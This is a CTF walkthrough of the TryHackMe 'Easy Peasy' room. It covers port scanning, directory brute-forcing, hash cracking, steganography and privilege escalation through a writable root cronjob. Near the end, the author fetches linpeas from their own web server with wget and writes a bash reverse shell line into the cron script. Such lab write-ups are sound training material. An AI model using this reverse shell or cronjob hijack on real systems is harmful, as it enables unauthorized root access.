---
title: "THM | Easy Peasy"
date: 2020-08-19T11:00:00-04:00
categories:
	- CTF
tags:
	- gobuster
	- steghide
	- cyberchef
	- linpeas
	- cronjob
	- gost
---

## Description:
The following post is writeup of the Easy Peasy room from tryhackme

- https://tryhackme.com/room/easypeasyctf
- *Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.*

![](https://imgur.com/flqWogA.png)

# Task 1

## 1.1 - How many ports are open?
Start with basic information gathering techniques. For CTF's, I like to scan all 65,535 ports because it's common for the creator to use unconventional ports. So, to start my scans I use a Python script that just simply scans all the ports to see if they are open or closed, nothing more, and uses 400 threads to make it go much faster. Then I use nmap on just those ports to enumerate more information.

![](https://imgur.com/NsKRs6y.png)

Some weird ports were indeed being used, but this script makes the process easy peasy. 

## 1.2 - What is the version of nginx?

Now it's time to enumerate for all the good information with nmap's greatness.

```
┌──(adam㉿Harambe)-[~/thm/easy-peasy]
└─$ nmap -A -p80,6498,65524 10.10.206.240
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 11:58 CDT
Nmap scan report for 10.10.206.240
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.16.1
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.89 seconds
```

## 1.3 - What is running on the highest port?
All the info we need for this task is in the nmap output. With this method of scanning, I was able to finish this task in less than a minute.

# Task 2

## 2.1 - Using GoBuster, find flag 1.

With there being two http ports open on the server there could be a lot of scanning and waiting so let's just start with the nginx server on port 80. 

```
gobuster dir -u http://10.10.206.240 -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 200
```

| Argument | Description |  
| :---: | :---: |  
| dir | Uses directory/file brutceforcing mode |  
| -u | The URL to bruteforce |
| -w | Path to the wordlist |
| -t | Number of concurrent threads |

Within a few seconds gobuster outputs a directory named **/hidden**

The page is just an image with no links or text that I could see, so I went to look at the source code:

```html
<!DOCTYPE html>
<html>
<head>
<title>Welcome to ctf!</title>
<style>
body {
background-image: url("https://cdn.pixabay.com/photo/2016/12/24/11/48/lost-places-1928727_960_720.jpg");
background-repeat: no-repeat;
background-size: cover;
width: 35em;
margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif;
}
</style>
</head>
<body>
</body>
</html>
```

I downloaded the image and did some basic stego on it, but turned out to be a dead in. Maybe a rabbit hole? I went to scan the apache port next, but then I realized to scan the /hidden directory itself since gobuster does not scan recursively. Turned out to be correct, gobuster found **/hidden/whatever**

It's another blank page with just an image, but the source code is more helpful here:

```html
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
body {
background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
background-repeat: no-repeat;
background-size: cover;
width: 35em;
margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif;
}
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```

There's something encoded in the hidden paragraph tag, almost certain it's base64 so I decode it from my terminal.

```
┌──(adam㉿Harambe)-[~/thm/easy-peasy]
└─$ echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
flag{*redacted*} 
```

Finally, first flag.

## 2.2 - Further enumerate the machine, what is flag 2?

Okay, it's finally time to check out the other web server on port 65524. It's an apache default page. If you have some good eyes you will notice something different about it though. In the middle on the page, in plain text, is the third flag. Just remember it for later.

If you remember from the nmap scan, there's a robots.txt file on this port. Here's what it contains:

> User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions

When I first saw this, I thought I had it all figured out, I'll set my User-Agent field in my header to match the given value. That didn't seem to really do anything though and I spent a lot of time here actually just trying to make sense of this. 

Turns out that value for the User-Agent is a md5 hash, so it's time to get to cracking. I like using [md5hashing.net](https://md5hashing.net/) or some other sites that do the same thing. I've moved away from cracking on my personal machine and using these type of sites instead. (only for CTFs)

> *Pro Tip: For CTFs, it's good to just paste the hash into google by itself and see if someone else has done the work already lol*

![](https://imgur.com/FXitiMl.png)

So there's the second flag in plain text from a google search.

## 2.3 - Crack the hash with easypeasy.txt, What is the flag 3?

The room has a download button for the easypeasy.txt file. It's a much smaller version of rockyou.txt (5140 lines). If you remember from above, there is a flag in the text of the home page on the apache server. 

![](https://imgur.com/ZpJA51M.png)

Well, the format the flag is in from the webpage is a md5 hash and this is the correct answer as is, so there's nothing more to be done. I cracked the hash with the site from earlier. Maybe this wasn't intended? Who knows.

## 2.4 - What is the hidden directory?

There's more information hidden in the source code of the apache page:

```html
</style>
</head>
<body>
<div class="main_page">
<div class="page_header floating_element">
<img src="[/icons/openlogo-75.png](http://10.10.206.240:65524/icons/openlogo-75.png)" alt="Debian Logo" class="floating_element"/>
<span class="floating_element">
Apache 2 It Works For Me
<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
</span>
</div>
```

Another hidden message in a paragraph tag and gives a good clue as well. It's encoded with some kind of base. For this kind of trial and error type of stuff I love using [CyberChef](https://gchq.github.io/CyberChef/). This is one of the best browser tools I've come across, it has a ton of versatility. 

![](https://imgur.com/YI0gIu0.png)

CyberChef shows that it's base62 and the directory name is **/n0th1ng3ls3m4tt3r**

## 2.5 - Using the wordlist that is provided to you in this task crack the hash what is the password?

So, going to the new directory we found there's a hash and an image on the page. The question let's you know what you need to do, figuring out what the hash algorithm is, is the challenge. 

Another reason I like using [md5hashing.net](https://md5hashing.net/) is that there is an option to use all hash types if you're not sure what algorithm your hash is.

![](https://imgur.com/WK1Ohrd.png)

In a few minutes the hash was cracked and revealed that is was a GOST hash. 

## 2.6 - What is the password to login to the machine via SSH?

Now that we have this password, let's do some stego on the image that was on the page. Download the image and run steghide on it to extract the hidden file. When asked for the password use the cracked hash from above.

```
┌──(adam㉿Harambe)-[~/thm/easy-peasy]
└─$ steghide --extract -sf binarycodepixabay.jpeg
Enter passphrase: 
wrote extracted data to "secrettext.txt".

```

| Argument | Description |  
| :---: | :---: |  
| - -extract | extract data |  
| -sf | extract data from < filename > |

steghide extracts a .txt file so let's see what's inside of it.

![](https://imgur.com/1gK9Pna.png)

The file has a username and password, but the password is in binary. Again, I used CyberChef to quickly decode it. After that, we have a clear text password. Finally, we have login credentials for SSH.

## 2.7 - What is the user flag?

Login with the new creds and remember SSH is on port 6498 so add the -p flag when logging in.

![](https://imgur.com/HNuI7ks.png)

The boring user has access to the user flag, but like the hint says, it's rotated. So once again I used CyberChef to try a ROT13 decode with the flag. That worked perfect and we have the correct flag now.

## 2.8 - What is the root flag?

The final task, escalate our privileges and get the root flag. Since I have the password for the current user, I will check their sudo permissions. 

```
boring@kral4-PC:~$ sudo -l
[sudo] password for boring: 
Sorry, user boring may not run sudo on kral4-PC.
```

No luck with that, so I'm going to upload a script that is very helpful for enumerating information to priv esc. I always use [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), first I'm going to check for the wget binary so I can download it to the target machine from my machine hosting the file.

```
boring@kral4-PC:~$ which wget
/usr/bin/wget
boring@kral4-PC:~$ ls -la /usr/bin/wget 
-rwxr-xr-x 1 root root 499264 Apr  8  2019 /usr/bin/wget

```

Okay perfect, so now I'll spin up a webserver on my machine hosting the file and use wget to download it to the target machine.

```
┌──(adam㉿Harambe)-[~/thm/easy-peasy/www]
└─$ sudo python3 -m http.server 80
[sudo] password for adam: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

| Argument | Description |  
| :---: | :---: |  
| -m | run library module as a script |  
| http.server | built in module to create a webserver |
| 80 | Uses port 80 (default is 8000) |

I always use the /dev/shm directory when I do this because I know I will have permissions there. So go there and download the file then run it. Don't forget to make it executable.

```
boring@kral4-PC:/dev/shm$ wget http://10.6.11.75/linpeas.sh
--2020-08-20 12:41:38--  http://10.6.11.75/linpeas.sh
Connecting to 10.6.11.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 229696 (224K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                              100%[============================================================================>] 224.31K   306KB/s    in 0.7s    

2020-08-20 12:41:39 (306 KB/s) - ‘linpeas.sh’ saved [229696/229696]
```

```
boring@kral4-PC:/dev/shm$ chmod +x linpeas.sh && ./linpeas.sh 
```

linpeas does its magic and finds a cronjob running as root.

![](https://imgur.com/PZPCOrn.png)

```
boring@kral4-PC:/dev/shm$ cd /var/www/
boring@kral4-PC:/var/www$ ls -la
total 16
drwxr-xr-x  3 root   root   4096 Jun 15 12:59 .
drwxr-xr-x 14 root   root   4096 Jun 13 15:55 ..
drwxr-xr-x  4 root   root   4096 Jun 15 00:58 html
-rwxr-xr-x  1 boring boring   33 Jun 14 22:43 .mysecretcronjob.sh
```

Yeah I think we've found the priv esc. So the easiest way of going about this is to set up a nc listener and just connect to it with a bash command in the script. You don't even need to put the listener on your attacking machine, just use the localhost address. Edit the script with the following:

```bash
#!/bin/bash
bash -i >& /dev/tcp/127.0.0.1/9001 0>&1
```

Now just set up a listener on the port and become root.

![](https://imgur.com/GuH6KW5.png)

And that's it, machine rooted.